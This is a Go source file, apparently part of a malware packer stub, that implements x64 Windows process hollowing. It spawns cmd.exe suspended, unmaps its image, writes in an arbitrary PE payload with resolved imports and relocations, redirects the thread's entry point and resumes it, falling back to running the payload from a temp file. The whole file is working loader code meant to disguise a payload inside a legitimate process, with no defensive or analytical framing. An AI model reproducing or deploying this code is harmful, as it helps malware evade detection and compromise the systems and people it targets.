//go:build ignore

package main

import (
	"encoding/binary"
	"os"
	"syscall"
	"unsafe"
)

// ---------------------------------------------------------------------------
// Windows types
// ---------------------------------------------------------------------------

// _STARTUPINFO mirrors the Windows STARTUPINFOW structure (96 bytes on x64).
type _STARTUPINFO struct {
	Cb            uint32
	_             uint32
	_             uintptr
	_             uintptr
	X, Y          uint32
	XSize, YSize  uint32
	XCountChars   uint32
	YCountChars   uint32
	FillAttribute uint32
	Flags         uint32
	ShowWindow    uint16
	_             uint16
	_             uint32
	StdInput      uintptr
	StdOutput     uintptr
	StdError      uintptr
}

// _PROCESS_INFORMATION mirrors the Windows PROCESS_INFORMATION structure.
type _PROCESS_INFORMATION struct {
	Process   uintptr
	Thread    uintptr
	ProcessID uint32
	ThreadID  uint32
}

// _CONTEXT64 is the full 0x4D0-byte x64 CONTEXT block.
// We use a flat byte array and named offsets so that alignment is exact
// and struct field indices do not go out of bounds.
type _CONTEXT64 [0x4D0]byte

// x64 CONTEXT field offsets (all from winnt.h / CONTEXT_AMD64 layout).
const (
	ctx64FlagsOff = 0x30 // DWORD  ContextFlags
	ctx64RcxOff   = 0x80 // DWORD64 Rcx  – entry point (set for hollowing)
	ctx64RdxOff   = 0x88 // DWORD64 Rdx  – PEB address (read at thread start)
	ctx64RipOff   = 0xF8 // DWORD64 Rip
)

func ctx64SetFlags(c *_CONTEXT64, f uint32) {
	binary.LittleEndian.PutUint32(c[ctx64FlagsOff:], f)
}
func ctx64Rdx(c *_CONTEXT64) uint64 {
	return binary.LittleEndian.Uint64(c[ctx64RdxOff:])
}
func ctx64SetRcx(c *_CONTEXT64, v uint64) {
	binary.LittleEndian.PutUint64(c[ctx64RcxOff:], v)
}

// ---------------------------------------------------------------------------
// PE section helpers
// ---------------------------------------------------------------------------

type hollowSection struct {
	virtualAddress uint32
	virtualSize    uint32
	rawOffset      uint32
	rawSize        uint32
}

func hollowParseSections(data []byte, peOff uint32) []hollowSection {
	nSec := binary.LittleEndian.Uint16(data[peOff+6:])
	optSz := binary.LittleEndian.Uint16(data[peOff+20:])
	start := peOff + 24 + uint32(optSz)
	out := make([]hollowSection, 0, nSec)
	for i := uint16(0); i < nSec; i++ {
		off := start + uint32(i)*40
		if int(off+40) > len(data) {
			break
		}
		out = append(out, hollowSection{
			virtualAddress: binary.LittleEndian.Uint32(data[off+12:]),
			virtualSize:    binary.LittleEndian.Uint32(data[off+8:]),
			rawOffset:      binary.LittleEndian.Uint32(data[off+20:]),
			rawSize:        binary.LittleEndian.Uint32(data[off+16:]),
		})
	}
	return out
}

func hollowRvaToOffset(secs []hollowSection, rva uint32) (uint32, bool) {
	for _, s := range secs {
		if rva >= s.virtualAddress && rva < s.virtualAddress+s.virtualSize {
			return s.rawOffset + (rva - s.virtualAddress), true
		}
	}
	return 0, false
}

func hollowReadCString(data []byte, off uint32) string {
	if int(off) >= len(data) {
		return ""
	}
	end := int(off)
	for end < len(data) && data[end] != 0 {
		end++
	}
	return string(data[off:end])
}

// ---------------------------------------------------------------------------
// IAT resolution (64-bit)
// ---------------------------------------------------------------------------

const imageOrdinalFlag64 = uint64(0x8000000000000000)

// hollowFixImports64 resolves the Import Address Table in-place on the
// local payload buffer. System DLLs share the same virtual address across
// all processes in the same session, so we call LoadLibrary/GetProcAddress
// in the packer stub and write the resolved addresses directly into the
// IAT entries of the buffer before writing it to the remote process.
func hollowFixImports64(buf []byte, optOff uint32, secs []hollowSection) {
	// PE32+ data directory entry 1 = Import Directory (at optOff + 112 + 8).
	dirOff := optOff + 112 + 1*8
	if int(dirOff+8) > len(buf) {
		return
	}
	importRVA := binary.LittleEndian.Uint32(buf[dirOff:])
	if importRVA == 0 {
		return
	}
	impFileOff, ok := hollowRvaToOffset(secs, importRVA)
	if !ok {
		return
	}

	// Walk IMAGE_IMPORT_DESCRIPTORs (20 bytes each, null-terminated).
	for off := impFileOff; ; off += 20 {
		if int(off+20) > len(buf) {
			break
		}
		origFT := binary.LittleEndian.Uint32(buf[off:])
		nameRVA := binary.LittleEndian.Uint32(buf[off+12:])
		firstThunk := binary.LittleEndian.Uint32(buf[off+16:])
		if nameRVA == 0 && firstThunk == 0 {
			break
		}

		nameOff, ok := hollowRvaToOffset(secs, nameRVA)
		if !ok {
			continue
		}
		dllName := hollowReadCString(buf, nameOff)
		if dllName == "" {
			continue
		}

		dllPtr, err := syscall.BytePtrFromString(dllName)
		if err != nil {
			continue
		}
		hMod, _, _ := procLoadLibraryA.Call(uintptr(unsafe.Pointer(dllPtr)))
		if hMod == 0 {
			continue
		}

		lookupRVA := origFT
		if lookupRVA == 0 {
			lookupRVA = firstThunk
		}

		for idx := uint32(0); ; idx++ {
			lkOff, ok := hollowRvaToOffset(secs, lookupRVA+idx*8)
			if !ok || int(lkOff+8) > len(buf) {
				break
			}
			ftOff, ok := hollowRvaToOffset(secs, firstThunk+idx*8)
			if !ok || int(ftOff+8) > len(buf) {
				break
			}

			thunk := binary.LittleEndian.Uint64(buf[lkOff:])
			if thunk == 0 {
				break
			}

			var addr uintptr
			if thunk&imageOrdinalFlag64 != 0 {
				// Import by ordinal.
				addr, _, _ = procGetProcAddress.Call(hMod, uintptr(thunk&0xFFFF))
			} else {
				// Import by name (IMAGE_IMPORT_BY_NAME: 2-byte Hint + name).
				hnOff, ok := hollowRvaToOffset(secs, uint32(thunk))
				if !ok || int(hnOff+2) >= len(buf) {
					break
				}
				fn := hollowReadCString(buf, hnOff+2) // skip Hint
				if fn == "" {
					break
				}
				fnPtr, _ := syscall.BytePtrFromString(fn)
				addr, _, _ = procGetProcAddress.Call(hMod, uintptr(unsafe.Pointer(fnPtr)))
			}
			if addr != 0 {
				binary.LittleEndian.PutUint64(buf[ftOff:], uint64(addr))
			}
		}
	}
}

// ---------------------------------------------------------------------------
// Local relocation processing (64-bit)
// ---------------------------------------------------------------------------

// hollowApplyRelocations64 processes the PE base-relocation table locally on
// the payload buffer, adjusting addresses by delta. Handles DIR64 (0xA) and
// HIGHLOW (0x3) types.
func hollowApplyRelocations64(buf []byte, optOff uint32, secs []hollowSection, delta int64) {
	// PE32+ data directory entry 5 = Base Relocation.
	dirOff := optOff + 112 + 5*8
	if int(dirOff+8) > len(buf) {
		return
	}
	relocRVA := binary.LittleEndian.Uint32(buf[dirOff:])
	relocSz := binary.LittleEndian.Uint32(buf[dirOff+4:])
	if relocRVA == 0 || relocSz == 0 {
		return
	}
	fOff, ok := hollowRvaToOffset(secs, relocRVA)
	if !ok || int(fOff)+int(relocSz) > len(buf) {
		return
	}

	tbl := buf[fOff:]
	off := uint32(0)
	for off < relocSz {
		if off+8 > relocSz {
			break
		}
		pageRVA := binary.LittleEndian.Uint32(tbl[off:])
		blkSz := binary.LittleEndian.Uint32(tbl[off+4:])
		if blkSz < 8 {
			break
		}
		off += 8
		n := (blkSz - 8) / 2
		for i := uint32(0); i < n; i++ {
			if off+2 > relocSz {
				return
			}
			e := binary.LittleEndian.Uint16(tbl[off:])
			off += 2
			t := e >> 12
			rva := pageRVA + uint32(e&0x0FFF)
			targetOff, ok := hollowRvaToOffset(secs, rva)
			if !ok {
				continue
			}
			switch t {
			case 0: // IMAGE_REL_BASED_ABSOLUTE – padding, skip
			case 0xA: // IMAGE_REL_BASED_DIR64
				if int(targetOff+8) <= len(buf) {
					v := binary.LittleEndian.Uint64(buf[targetOff:])
					binary.LittleEndian.PutUint64(buf[targetOff:], uint64(int64(v)+delta))
				}
			case 0x3: // IMAGE_REL_BASED_HIGHLOW
				if int(targetOff+4) <= len(buf) {
					v := binary.LittleEndian.Uint32(buf[targetOff:])
					binary.LittleEndian.PutUint32(buf[targetOff:], uint32(int64(v)+delta))
				}
			}
		}
	}
}

// ---------------------------------------------------------------------------
// Strategy entry point
// ---------------------------------------------------------------------------

func executeStrategy(payload []byte) {
	executeProcessHollowing(payload)
}

// executeProcessHollowing creates a suspended process, replaces its image with
// the given PE payload, resolves imports, optionally applies relocations
// (MSVC only), and resumes the thread.
//
// Key fixes over the previous version:
//   - Reads PEB address from Rdx (was Rcx: x64 ABI puts PEB in Rdx).
//   - Resolves the Import Address Table locally before writing to target.
//   - Detects linker (MSVC≥10 vs MinGW<10) to decide relocation strategy.
//   - Applies relocations locally on a working copy (no ReadProcessMemory).
//   - Sets entry point via Rcx (RtlUserThreadStart calls Rcx on x64).
func executeProcessHollowing(payload []byte) {
	if len(payload) < 0x1000 || payload[0] != 'M' || payload[1] != 'Z' {
		executeFromTemp(payload)
		return
	}
	peOff := binary.LittleEndian.Uint32(payload[0x3C:])
	if int(peOff)+4 > len(payload) || string(payload[peOff:peOff+4]) != "PE\x00\x00" {
		executeFromTemp(payload)
		return
	}

	optOff := peOff + 24
	imageBase := binary.LittleEndian.Uint64(payload[optOff+24:])
	sizeOfImage := binary.LittleEndian.Uint32(payload[optOff+56:])
	sizeOfHeaders := binary.LittleEndian.Uint32(payload[optOff+60:])
	entryRVA := binary.LittleEndian.Uint32(payload[optOff+16:])

	// Linker detection: MajorLinkerVersion at PE+26 (= optOff+2).
	// MSVC ≥ 10 → non-PIC, requires relocations.
	// MinGW < 10 → PIC, relocations would corrupt code.
	isMSVC := payload[peOff+26] >= 10

	// Create a suspended host process.
	target := os.Getenv("ComSpec")
	if target == "" {
		target = `C:\Windows\System32\cmd.exe`
	}
	hProc, hThread, ok := hollowCreateProcess(target)
	if !ok {
		executeFromTemp(payload)
		return
	}
	defer procCloseHandle.Call(hThread)
	defer procCloseHandle.Call(hProc)

	// Read thread context — Rdx holds PEB address on x64.
	var ctx _CONTEXT64
	const ctxFull = 0x0010001B // CONTEXT_AMD64 | CONTEXT_FULL | DEBUG_REGISTERS
	ctx64SetFlags(&ctx, ctxFull)
	procGetThreadCtx.Call(hThread, uintptr(unsafe.Pointer(&ctx)))
	remotePEB := ctx64Rdx(&ctx)

	// Read target ImageBase from PEB+0x10 (ImageBaseAddress for 64-bit PEB).
	var remoteImageBase uint64
	var nRead uintptr
	procReadProcessMem.Call(
		hProc,
		uintptr(remotePEB)+0x10,
		uintptr(unsafe.Pointer(&remoteImageBase)),
		8,
		uintptr(unsafe.Pointer(&nRead)),
	)

	// Unmap the original process image.
	if remoteImageBase != 0 {
		procNtUnmapView.Call(hProc, uintptr(remoteImageBase))
	}

	// Allocate memory. MSVC prefers payload's ImageBase; MinGW prefers the
	// original remote base (PIC code, no relocation needed).
	var desiredBase uintptr
	if isMSVC {
		desiredBase = uintptr(imageBase)
	} else if remoteImageBase != 0 {
		desiredBase = uintptr(remoteImageBase)
	} else {
		desiredBase = uintptr(imageBase)
	}
	base, _, _ := procVirtualAllocEx.Call(hProc, desiredBase, uintptr(sizeOfImage), 0x3000, 0x40)
	if base == 0 && isMSVC && desiredBase != uintptr(remoteImageBase) && remoteImageBase != 0 {
		base, _, _ = procVirtualAllocEx.Call(hProc, uintptr(remoteImageBase), uintptr(sizeOfImage), 0x3000, 0x40)
	}
	if base == 0 {
		base, _, _ = procVirtualAllocEx.Call(hProc, 0, uintptr(sizeOfImage), 0x3000, 0x40)
		if base == 0 {
			executeFromTemp(payload)
			return
		}
	}

	// Work on a copy so IAT/relocation patches do not touch the original.
	buf := make([]byte, len(payload))
	copy(buf, payload)

	secs := hollowParseSections(buf, peOff)

	// Fix imports FIRST — must happen before relocations which would shift
	// the thunk values and corrupt lookup entries.
	hollowFixImports64(buf, optOff, secs)

	// Apply relocations (MSVC only, when allocated base ≠ preferred base).
	delta := int64(base) - int64(imageBase)
	if isMSVC && delta != 0 {
		hollowApplyRelocations64(buf, optOff, secs, delta)
	}

	// Write PE headers.
	if !hollowWriteMem(hProc, base, buf[:sizeOfHeaders]) {
		executeFromTemp(payload)
		return
	}

	// Write sections from the modified buffer.
	nSec := binary.LittleEndian.Uint16(buf[peOff+6:])
	optSz := binary.LittleEndian.Uint16(buf[peOff+20:])
	secStart := peOff + 24 + uint32(optSz)
	for i := uint16(0); i < nSec; i++ {
		hdr := secStart + uint32(i)*40
		if int(hdr+40) > len(buf) {
			break
		}
		va := binary.LittleEndian.Uint32(buf[hdr+12:])
		rawSz := binary.LittleEndian.Uint32(buf[hdr+16:])
		rawPtr := binary.LittleEndian.Uint32(buf[hdr+20:])
		if rawSz == 0 || int(rawPtr+rawSz) > len(buf) {
			continue
		}
		if !hollowWriteMem(hProc, base+uintptr(va), buf[rawPtr:rawPtr+rawSz]) {
			executeFromTemp(payload)
			return
		}
	}

	// Update PEB ImageBaseAddress in remote process.
	newBase := uint64(base)
	hollowWriteMem(hProc, uintptr(remotePEB)+0x10,
		(*[8]byte)(unsafe.Pointer(&newBase))[:])

	// Set entry point via Rcx (standard x64 hollowing: RtlUserThreadStart
	// calls the function address in Rcx at thread start).
	ctx64SetRcx(&ctx, uint64(base)+uint64(entryRVA))
	procSetThreadCtx.Call(hThread, uintptr(unsafe.Pointer(&ctx)))
	procResumeThread.Call(hThread)
}

// ---------------------------------------------------------------------------
// Process and memory helpers
// ---------------------------------------------------------------------------

func hollowCreateProcess(targetPath string) (hProcess, hThread uintptr, ok bool) {
	appName, err := syscall.UTF16PtrFromString(targetPath)
	if err != nil {
		return 0, 0, false
	}
	var si _STARTUPINFO
	si.Cb = uint32(unsafe.Sizeof(si))
	var pi _PROCESS_INFORMATION
	const createSuspended = 0x00000004
	r, _, _ := procCreateProcess.Call(
		uintptr(unsafe.Pointer(appName)),
		0, 0, 0, 0,
		createSuspended,
		0, 0,
		uintptr(unsafe.Pointer(&si)),
		uintptr(unsafe.Pointer(&pi)),
	)
	if r == 0 {
		return 0, 0, false
	}
	return pi.Process, pi.Thread, true
}

func hollowWriteMem(hProcess, addr uintptr, data []byte) bool {
	if len(data) == 0 {
		return true
	}
	var written uintptr
	r, _, _ := procWriteProcessMem.Call(
		hProcess, addr,
		uintptr(unsafe.Pointer(&data[0])),
		uintptr(len(data)),
		uintptr(unsafe.Pointer(&written)),
	)
	return r != 0
}
